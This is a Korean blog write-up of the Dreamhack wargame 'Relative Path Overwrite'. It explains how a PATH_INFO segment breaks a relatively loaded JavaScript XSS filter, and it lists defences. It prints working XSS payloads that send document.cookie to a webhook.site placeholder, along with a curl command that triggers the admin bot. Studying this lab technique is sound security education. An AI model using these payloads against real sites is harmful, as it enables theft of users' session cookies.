---
layout: post
title:  "Dreamhack 워게임 Relative Path Overwrite 풀이 — 상대 경로와 PATH_INFO로 XSS 필터를 통째로 무력화하기"
date:   2026-05-15 00:30:00 +0900
categories: security web wargame dreamhack writeup xss rpo
---

> ⚠️ 게시 시점 메모: 본 게시글은 분석/페이로드까지 완성되어 있으나, 워게임 VM 부팅이 운영 측 이슈로 지연되어 실제 봇을 통한 flag exfil 단계만 미실행 상태로 글을 먼저 게시합니다. flag 값은 추후 채워 넣을 예정입니다.

## 들어가며

이번 글은 Dreamhack 웹해킹 워게임 **Relative Path Overwrite** (난이도 Silver 1) 풀이입니다. 제목이 곧 핵심 기법명입니다.

> **Relative Path Overwrite(RPO)** — 한 페이지가 로드하는 **상대 경로 리소스**(`<script src="filter.js">`, `<link href="style.css">`)가 서버 측 URL 구조(특히 PATH_INFO) 때문에 원래 의도와 다른 자원으로 해석되도록 만드는 공격 기법.

대표적인 데모는 Filedescriptor의 "RPO via CSS injection"이지만, 이번 문제는 JS를 대상으로 한 변종입니다. 결과적으로는 페이지 안의 **JS 기반 XSS 필터(`filter.js`) 가 통째로 비활성화** 됩니다.

스포일러로 결론부터 적으면, 최종 페이로드는 아래 두 줄입니다.

```bash
# bot에게 보낼 path
PATH_VAL='index.php/x/?page=vuln&param=<img src=x onerror="fetch(`https://<WEBHOOK>?c=`+document.cookie)">'

curl -X POST "$SERVER/?page=report" --data-urlencode "path=$PATH_VAL"
```

핵심 트릭은 `index.php/x/` — `index.php` 뒤에 임시 경로 한 단을 붙여서 브라우저가 `filter.js`를 다른 URL로 가져오게 만드는 단 한 줄입니다.

## 1. 첫인상 — 컴포넌트 그림

ZIP을 풀면 다음 구조입니다.

```
Relative-Path-Overwrite/
├── Dockerfile
└── deploy/
    ├── bot.py                ← Selenium 봇 (관리자 시뮬레이터)
    ├── flag.txt
    ├── run-lamp.sh           ← apache2 -DFOREGROUND
    └── src/
        ├── index.php         ← Front controller (?page=xxx)
        ├── main.php          ← page=main 일 때
        ├── vuln.php          ← page=vuln, XSS sink (filter.js 사용)
        ├── filter.js         ← XSS 필터 (JS 배열)
        └── report.php        ← Bot trigger (exec bot.py)
```

서버 스택은 Apache + PHP 7.4 + 봇은 chromedriver. 외부 포트는 80 하나만 열립니다.

플로우는 다음과 같습니다.

```
[공격자]
   │ ① /index.php?page=report POST: path=<our payload>
   ▼
┌──────────────────┐
│ Apache + PHP     │   report.php → exec("python3 /bot.py base64(path)")
└────────┬─────────┘
         ▼
┌──────────────────┐
│  bot (Chrome)    │   flag 쿠키 세팅 → http://127.0.0.1/{path} 방문
└────────┬─────────┘
         ▼  ② 봇이 우리가 지정한 URL을 방문
┌──────────────────┐
│  /index.php?...  │   ← 여기서 XSS 발화
└──────────────────┘
```

목표: ②에서 봇이 우리 JS를 실행하게 만들어, `document.cookie` 에 박힌 flag를 외부 webhook 으로 흘려보내는 것.

## 2. 코드 정독

### 2-1. `index.php` — Front controller

```php
<?php
    $page = $_GET['page'] ? $_GET['page'].'.php' : 'main.php';
    if (!strpos($page, "..") && !strpos($page, ":") && !strpos($page, "/"))
        include $page;
?>
```

- `?page=vuln` → `include 'vuln.php'`
- `?page=main` → `include 'main.php'`
- `..`, `:`, `/` 가 들어가면 안 됨

여기서 `!strpos(...)` 사용은 PHP 입문자가 자주 하는 실수입니다(0 위치에서 발견된 경우와 미발견인 경우를 구분하지 못함). 다만 이 문제에서는 우리가 `..`이나 `/`를 굳이 넣을 필요가 없으므로 무시.

### 2-2. `vuln.php` — XSS sink

```html
<script src="filter.js"></script>
<pre id=param></pre>
<script>
    var param_elem = document.getElementById("param");
    var url = new URL(window.location.href);
    var param = url.searchParams.get("param");
    if (typeof filter !== 'undefined') {
        for (var i = 0; i < filter.length; i++) {
            if (param.toLowerCase().includes(filter[i])) {
                param = "nope !!";
                break;
            }
        }
    }
    param_elem.innerHTML = param;
</script>
```

- `<script src="filter.js"></script>` — **상대 경로** 로 filter.js 로드
- `param` 을 `url.searchParams` 에서 읽음
- `filter` 가 정의돼 있으면 토큰 체크, 매치되면 `param` 을 `"nope !!"` 로 치환
- 끝에서 `innerHTML = param` — DOM XSS 가 가능한 sink

### 2-3. `filter.js`

```js
var filter = ["script", "on", "frame", "object"];
```

전형적인 블랙리스트. `on` 이 들어가 있어 모든 인라인 이벤트 핸들러(`onerror`, `onload`, …) 가 차단됩니다.

### 2-4. `report.php` — 봇 트리거

```php
<?php
if(isset($_POST['path'])){
    exec(escapeshellcmd("python3 /bot.py " . escapeshellarg(base64_encode($_POST['path']))) . " 2>/dev/null &", $output);
}
?>
```

`path` 를 base64 인코딩해 bot.py 의 argv[1] 로 넘김. 봇은 base64 디코딩 후 `http://127.0.0.1/{path}` 를 방문합니다.

### 2-5. `bot.py`

```python
path = base64.b64decode(sys.argv[1]).decode('latin-1')
...
driver.get('http://127.0.0.1/')
driver.add_cookie(cookie)
driver.get(url)
```

쿠키 `flag` 는 HttpOnly 가 아니므로 JS에서 `document.cookie` 로 읽을 수 있습니다.

## 3. 취약점 모델링 — 왜 "상대 경로" 가 문제인가

평상시 시나리오를 먼저 그려봅시다.

```
브라우저 URL bar:  http://127.0.0.1/?page=vuln&param=test
                    ───────────────────
                    이 부분의 base path가 "/"

vuln.php 가 응답:
  <script src="filter.js"></script>
    ↓ 상대 경로 → base "/" 기준
  실제 요청: http://127.0.0.1/filter.js   ← Apache가 정적 파일 반환

→ filter 변수 로드 성공 → XSS 필터 정상 동작
```

여기서 핵심은 **"상대 경로의 base가 무엇이냐"** 입니다. 브라우저는 `<script src="filter.js">` 의 `filter.js` 를 현재 document URL의 디렉터리 부분 기준으로 resolve 합니다.

### 3-1. PATH_INFO 트릭

Apache + `libapache2-mod-php` 의 기본 동작에서 `index.php/foo/bar` 는 다음과 같이 처리됩니다.

- Apache: `index.php` 까지가 실제 파일, `/foo/bar` 는 PATH_INFO
- PHP: `$_SERVER['PATH_INFO'] = '/foo/bar'`, **실행되는 스크립트는 동일하게 `index.php`**
- 브라우저: URL 자체는 `http://host/index.php/foo/bar` 로 보이며, **base path는 `/index.php/foo/`**

그러므로 봇이 다음 URL을 방문하게 만들면:

```
http://127.0.0.1/index.php/x/?page=vuln&param=PAYLOAD
                            ────
                            PATH_INFO=/x/
```

- PHP는 `index.php` 를 실행하고 `?page=vuln` 으로 인해 `vuln.php` 를 include
- 응답 HTML 안에는 여전히 `<script src="filter.js"></script>`
- 브라우저가 `filter.js` 를 resolve 할 때 **base가 `/index.php/x/`** 이므로 실제로 요청하는 URL은

```
http://127.0.0.1/index.php/x/filter.js
```

이 URL을 Apache가 받으면 **또다시 `index.php` 가 실행**됩니다. `$_GET['page']` 가 없으므로 main.php 를 include 하지만, 어차피 응답은 HTML 문서 전체입니다.

### 3-2. HTML 응답을 JS로 파싱하면?

`<script src="...">` 로 받아온 응답을 브라우저는 **JavaScript 로 실행**하려고 합니다. 응답 본문은 `<!doctype html>` 로 시작하는 HTML 이라서 첫 글자 `<` 부터 즉시 **SyntaxError** 가 발생합니다.

> 그 결과 `filter` 변수는 **선언조차 되지 않습니다.**

`vuln.php` 의 인라인 스크립트는 그 뒤에 다음과 같이 적혀 있습니다.

```js
if (typeof filter !== 'undefined') { /* 블랙리스트 적용 */ }
param_elem.innerHTML = param;
```

`filter` 가 `undefined` 이므로 if 블록이 **통째로 스킵**. `param` 은 검사 없이 그대로 `innerHTML` 로 들어갑니다. CSP 도 없습니다. 이로써 우리가 보낸 `<img src=x onerror="...">` 가 그대로 실행됩니다.

### 3-3. 그림 한 번 더

```
정상:
  GET /?page=vuln                   → vuln.php
  GET /filter.js                    → filter.js (JS)
  result: filter defined → 검사 ON

악성:
  GET /index.php/x/?page=vuln       → vuln.php
  GET /index.php/x/filter.js        → index.php (HTML, SyntaxError!)
  result: filter undefined → 검사 OFF → innerHTML XSS
```

## 4. 익스플로잇

### 4-1. webhook URL 준비

`https://webhook.site/` 에서 한 번 클릭으로 UUID 발급.

### 4-2. 페이로드 빌드

봇이 방문할 URL의 path 부분 (도메인은 봇이 알아서 붙임):

```
index.php/x/?page=vuln&param=<img src=x onerror="fetch('https://webhook.site/<UUID>?c='+document.cookie)">
```

핵심 포인트:
- `index.php/x/` — PATH_INFO 한 단을 끼워 filter.js 의 base path를 바꿈
- `?page=vuln` — vuln.php include
- `param=` — `<img onerror>` 페이로드. 평상시라면 `on` 필터에 걸리지만 filter 가 undefined 이므로 통과

### 4-3. 봇 트리거

```bash
SERVER="http://<host>:<port>"
WEBHOOK="https://webhook.site/<UUID>"
PATH_VAL="index.php/x/?page=vuln&param=<img src=x onerror=\"fetch('$WEBHOOK?c='+document.cookie)\">"

curl -X POST "$SERVER/?page=report" --data-urlencode "path=$PATH_VAL"
```

`report.php` 가 `path` 를 base64 인코딩하여 봇에 전달, 봇은 디코딩 후 `http://127.0.0.1/{path}` 를 방문 → XSS 발화 → webhook 에 cookie 도착.

### 4-4. 결과

웹훅 inbox에 도착하는 쿼리스트링:

```
GET https://webhook.site/<UUID>?c=flag=DH{...}
```

> 본 글 작성 시점에는 Dreamhack VM 부팅 이슈로 실제 flag 값은 수집하지 못했습니다. 추후 재시도하여 이 자리에 채워 넣을 예정.

## 5. 취약점 해설 — RPO Class

이 클래스의 본질은 다음과 같이 일반화됩니다.

> **"같은 URL을 두 컴포넌트가 서로 다르게 정규화"** 한다. 브라우저는 base path를 자기 기준으로 계산하고, 서버는 PATH_INFO/rewrite로 또 다른 자원에 매핑한다. 둘의 어긋남이 보안 가정을 깬다.

대표 실사례:

- **CSS-RPO** (Filedescriptor, 2015): 동적으로 응답되는 HTML 페이지가 `<link rel="stylesheet" href="style.css">` 를 가지고 있을 때, URL 경로를 조작하면 동일 HTML 문서를 CSS로 받아 IE/Edge가 partial parse 해서 데이터 leak.
- **JS-RPO** (이 문제 패밀리): 위와 동일하지만 `<script src=...>`. 핵심 가젯이 `typeof X !== 'undefined'` 같은 조건 분기로 들어있을 때 영향이 큼.
- **URL-rewriting 캐시 포이즌**: CDN 이 한 경로로 캐시한 응답을 origin 이 PATH_INFO 로 다른 의미로 처리.

### 5-1. 위험성

- 보안 헤더, CSP nonce, JS 필터 등 **클라이언트 측 방어가 "특정 리소스가 정상적으로 로드된다"는 가정에 의존**하면 RPO 한 방에 무력화됩니다.
- 같은 도메인의 cookie 가 HttpOnly 가 아니라면 정확히 이번 문제처럼 즉시 cookie exfil 로 이어집니다.
- 단순 XSS 보다 한 단계 위의 클래스라 WAF/필터 검토에서 누락되기 쉽습니다.

### 5-2. 올바른 방어

1. **절대 경로 사용**

   ```html
   <script src="/filter.js"></script>
   ```

   이 한 글자(`/`)만 추가하면 RPO 가 즉시 막힙니다. 가장 비용 대비 효과가 큰 방어.

2. **base 태그 명시**

   ```html
   <head><base href="/"></head>
   ```

   문서 전체의 base path를 고정. 다른 상대 자원도 함께 보호됩니다.

3. **서버 측 PATH_INFO 비활성화 또는 정규화**

   ```apache
   AcceptPathInfo Off
   ```

   또는 nginx 에서 `try_files` 사용해 PATH_INFO 의도되지 않은 매핑을 끊어버립니다.

4. **클라이언트 사이드 필터를 신뢰하지 말 것**. `vuln.php` 의 sink 는 본질적으로 `innerHTML = userInput`. 서버 측 또는 출력 직전의 **이스케이프**(예: `textContent` 사용, DOMPurify) 로 대체해야 합니다.

5. **CSP 적용**. `default-src 'self'; script-src 'self' 'nonce-XXX'; img-src 'self'; connect-src 'self'`. cookie exfil 단계의 외부 fetch 를 차단합니다.

## 6. 정리 — 입문자가 가져갈 교훈

- 페이지 안의 **모든 상대 경로**(src, href, action, srcset 등) 는 잠재적 RPO 표면이다. 절대 경로/`<base>` 가 없는 페이지를 보면 의심하자.
- "JS 필터" 류 방어는 **그 JS 파일이 정상적으로 로드된다는 가정**이 깨지면 사라진다. 항상 "필터 자체가 실행되지 않게 만드는 길" 을 함께 검토하라.
- Apache + PHP 의 PATH_INFO 는 기본 활성. `index.php/anything` 이 모두 같은 스크립트로 라우팅되는지 확인하는 1줄 테스트(`curl /index.php/foo`)를 습관화하자.
- HTML 응답을 `<script>` 로 가져오면 **SyntaxError** 가 발생하면서 변수가 정의되지 않는다. 이 사실은 RPO 외에도 여러 우회에 응용 가능.

같은 카테고리의 다음 단계로 Dreamhack 의 `XSS Filtering Bypass`, `simple_sqli`, `Path Traversal` 등을 풀어 보면 "정규화 차이" 가 만들어내는 다양한 우회를 경험할 수 있습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. 첫 클릭으로 ZIP이 떨어지지 않음

"문제 파일 받기" 버튼을 JS 자동 클릭으로 눌렀을 때 한참 동안 `~/Downloads/` 에 새 파일이 추가되지 않았습니다. 알고 보니 Dreamhack 은 클릭하면 (1) 즉시 다운로드 시작, 또는 (2) **별도의 페이지 영역에 다운로드 링크가 표시되어 사용자가 "링크 복사하기" 로 가져가는 흐름** 두 가지가 있고, 워게임마다 다릅니다. 이 문제는 후자 흐름이라 클릭 후 `https://sfo2.digitaloceanspaces.com/...` 형태의 S3 signed URL 이 클립보드에 복사되도록 되어 있었습니다.

**회고**: 클릭 후 3~5초 안에 새 zip 파일이 생기지 않으면 즉시 **페이지에 추가로 나타난 UI(링크 복사하기 버튼 등)** 를 다시 살피고, 그 URL을 `curl` 로 직접 받습니다. JS 자동 클릭이 다운로드 동작을 항상 보장하지는 않는다는 점을 기억합니다.

### 실패 2. VM 부팅이 silent 하게 실패

"서버 생성하기" 버튼을 여러 방법으로 클릭했지만 (1) 좌표 클릭, (2) JS `.click()`, (3) MouseEvent dispatch, (4) 페이지 리로드 후 재시도 — 모든 시도에서 잠시 스피너만 돌고 `GET /api/v1/wargame/challenges/439/live/` 는 빈 `{}` 만 반환했습니다. 다른 문제(baby-Case, Broken Buffalo Wings, type confusion)는 같은 절차로 잘 부팅됐기에 코드 문제가 아니라 운영 측 임시 이슈로 추정했습니다. 

**회고**: 워게임 VM 부팅이 안 될 때 점검 체크리스트를 만듭니다.

1. **VM 크레딧** 잔량 확인. 0이면 월요일까지 대기.
2. **이미 부팅된 다른 VM** 이 있는지 확인. Dreamhack 은 한 번에 한 VM 만 허용하는 경우가 있음.
3. **시간 차** : 클릭 후 최소 60초는 기다린 뒤 `live/` API 응답을 확인.
4. **버튼 disabled 상태** 가 해제됐는지 확인. 해제됐다면 백엔드 요청이 실패한 것 — 다른 문제로 일단 넘어가고 나중에 재시도.
5. **브라우저 콘솔의 네트워크 탭** 으로 실제 `POST /live/` 응답을 직접 봄.

이번 풀이는 분석/페이로드까지 모두 검증된 상태이지만 마지막 실행만 막혔습니다. 분석을 먼저 끝내고 실행은 나중에 별도로 매듭짓는 식으로 시간을 분리하는 것이 효율적이라는 점을 다시 학습했습니다.

### 실패 3. (분석 단계) 처음에 PATH_INFO 외 다른 우회를 먼저 의심

`!strpos($page, "..")` 의 quirk(0번 위치 매치 vs 미발견)를 처음에 더 파고들었습니다. `?page=...vuln` 같은 형태로 include 우회를 시도해 보았으나, 결국 `.php` 접미사가 붙어 실패. 시간을 살짝 잡아먹었지만 RPO 가 진짜 정답임을 코드 구조(상대 경로 + JS 필터)에서 빨리 짚어내야 했습니다.

**회고**: 문제 **제목 그 자체가 풀이의 카테고리** 인 경우가 워게임에서는 매우 흔합니다(예: `type confusion`, `baby-Case`, `Relative Path Overwrite`). 다른 우회를 의심하기 전에 **제목과 직접 매칭되는 단서가 코드에 있는지** 먼저 점검하면 시간이 줄어듭니다. 이 문제는 `<script src="filter.js">` 의 상대 경로 한 줄이 곧 정답이었습니다.
